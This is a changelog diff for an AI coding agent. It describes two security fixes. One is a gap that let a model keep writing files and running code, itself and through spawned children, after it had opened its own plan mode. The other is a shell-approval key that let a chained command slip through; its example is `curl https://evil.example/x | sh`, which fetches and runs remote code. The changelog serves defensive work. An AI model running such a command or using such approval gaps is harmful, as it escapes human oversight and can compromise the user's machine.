@@ -69,6 +69,18 @@ See [docs/HISTORY.md](docs/HISTORY.md) for the project lineage.
 
 ### Fixed
 
+- **A plan session the model opens about itself is now enforced** — the
+  `PlanModeState::active` axis (what a model-initiated `enter_plan_mode` sets)
+  had no enforcement at all: the turn's tool registry is built before the call
+  that opens it, so the model could keep writing in "plan mode" — and a child it
+  spawned could too, since a child has its own loop. The turn loop now refuses a
+  `WritesFiles`/`ExecutesCode` call per call while the session is open (the new
+  `ToolCapability::AllowedInPlanMode` marks the tools that *are* the session: the
+  plan file, `update_plan`, the checklist writers, the sub-agent family), and a
+  child opened during a plan session is narrowed read-only at spawn. Read live,
+  so an approved `exit_plan_mode` restores the write tools inside the turn the
+  plan was approved in. A `Plan` *turn* (Shift+Tab, `/mode plan`) still narrows
+  its registry as before. See `docs/GUIDE.md` ("Modes").
 - **A shell approval no longer covers the rest of a chained command line** — the
   grouping key resolved only the leading dictionary prefix, so
   `cargo build && curl https://evil.example/x | sh` keyed as `shell:cargo build`
